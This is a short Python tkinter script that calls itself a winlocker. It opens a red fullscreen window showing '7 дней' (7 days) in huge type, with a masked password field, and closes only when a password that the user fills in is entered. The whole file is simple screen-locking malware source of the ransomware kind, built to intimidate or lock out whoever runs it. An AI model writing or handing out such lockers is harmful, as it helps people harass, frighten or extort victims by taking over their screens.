import tkinter as tk
def checkpass():
    if entry.get() == "": #<--------- ВАШ ПАРОЛЬ
        root.destroy()

def create_winlocker():
    global root, entry
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(background='red')
    label = tk.Label(root, text= "7 дней ", font=("Helvetica", 350), fg="black", bg="red" )
    label.pack(expand=True)

    entry = tk.Entry(root, show="*", font=("Helvetica", 24), fg="black", bg="white", width=20)
    entry.pack(pady=20)

    button = tk.Button(root, text="yes", font=("Helvetica", 18), command=checkpass)
    button.pack(pady=10)

  
    root.mainloop()

if __name__ == "__main__":
    create_winlocker()

